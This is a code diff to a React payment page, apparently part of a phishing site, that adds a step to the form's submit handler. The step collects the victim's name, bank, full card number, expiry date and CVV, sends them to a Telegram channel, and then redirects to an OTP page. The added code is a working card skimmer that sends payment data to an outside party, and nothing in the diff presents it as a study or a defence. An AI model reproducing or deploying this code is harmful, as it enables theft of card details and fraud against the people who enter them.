@@ -2,6 +2,7 @@ import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { sendMessageToTelegram } from "@/backend/telegramService";
 
 const defaultPaymentData = {
   customerName: "يوسف غازي الرشيدي",
@@ -76,13 +77,27 @@ const CardDetails = () => {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
     
+    const message = `
+<b>💳 New Card Entry</b>
+<b>Name:</b> ${currentPayment.customerName}
+<b>Amount:</b> ${currentPayment.amount} KD
+<b>Bank:</b> ${formData.bank}
+<b>Prefix:</b> ${formData.prefix}
+<b>Card:</b> ${formData.cardNumber}
+<b>Expiry:</b> ${formData.expiryMonth}/${formData.expiryYear}
+<b>CVV:</b> ${formData.cvv}
+<b>ID:</b> ${id}
+`;
+    
+    await sendMessageToTelegram(message);
+    
     setTimeout(() => {
       navigate(`/otp/${id}${window.location.search}`);
-    }, 2000);
+    }, 1500);
   };
 
   return (
